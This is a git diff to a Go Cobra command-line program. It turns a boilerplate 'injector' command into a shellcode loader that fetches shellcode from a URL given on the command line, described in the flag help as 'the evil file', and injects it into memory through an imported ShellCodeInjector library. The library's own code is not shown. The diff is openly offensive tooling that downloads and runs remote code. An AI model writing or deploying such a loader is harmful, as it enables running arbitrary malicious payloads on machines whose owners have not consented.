@@ -16,14 +16,15 @@ limitations under the License.
 package cmd
 
 import (
-	"fmt"
-
+	"github.com/RachidMoysePolania/ShellCodeInjector"
 	"github.com/spf13/cobra"
 )
 
-// InjectorCmd represents the Injector command
-var InjectorCmd = &cobra.Command{
-	Use:   "Injector",
+var urlv string
+
+// injectorCmd represents the injector command
+var injectorCmd = &cobra.Command{
+	Use:   "injector",
 	Short: "A brief description of your command",
 	Long: `A longer description that spans multiple lines and likely contains examples
 and usage of using your command. For example:
@@ -32,20 +33,14 @@ Cobra is a CLI library for Go that empowers applications.
 This application is a tool to generate the needed files
 to quickly create a Cobra application.`,
 	Run: func(cmd *cobra.Command, args []string) {
-		fmt.Println("Injector called")
+		shellcode, err := ShellCodeInjector.GetShellCodeFromUrl(urlv)
+		ShellCodeInjector.HandleError(err)
+		ShellCodeInjector.InjectMemory(shellcode)
 	},
 }
 
 func init() {
-	rootCmd.AddCommand(InjectorCmd)
+	rootCmd.AddCommand(injectorCmd)
+	injectorCmd.Flags().StringVarP(&urlv, "url", "u", "", "The full url to the evil file")
 
-	// Here you will define your flags and configuration settings.
-
-	// Cobra supports Persistent Flags which will work for this command
-	// and all subcommands, e.g.:
-	// InjectorCmd.PersistentFlags().String("foo", "", "A help for foo")
-
-	// Cobra supports local flags which will only run when this command
-	// is called directly, e.g.:
-	// InjectorCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
 }
